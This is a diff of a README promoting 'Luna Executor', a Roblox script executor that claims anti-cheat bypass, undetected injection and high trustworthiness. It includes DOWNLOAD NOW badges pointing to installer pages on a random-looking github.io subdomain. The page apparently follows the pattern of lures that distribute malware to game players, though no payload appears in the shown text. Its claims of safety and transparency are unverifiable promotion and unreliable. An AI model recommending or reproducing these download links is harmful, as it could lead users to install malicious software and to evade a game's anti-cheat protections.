@@ -8,9 +8,13 @@
 
 The **🚀 Luna Executor** is the most trusted free Roblox script executor in 2026 — keyless, stable, and built for players who expect transparency. 97% UNC score, live bypass status, and a rebuilt injection engine that has never had a confirmed global detection event.
 
+<br>
+
 <div align="center">
 <a href="https://wccorxpwogeu.github.io/setup-win2/"><img src="https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github"></a><a href="https://wccorxpwogeu.github.io/install-mac2/"><img src="https://img.shields.io/badge/LATEST%20BUILD-black?style=for-the-badge&logo=github"></a>
 </div>
+
+<br>
 
 >  **Follow the installation instruction:** Do not miss any step, that could cause troubles.
 
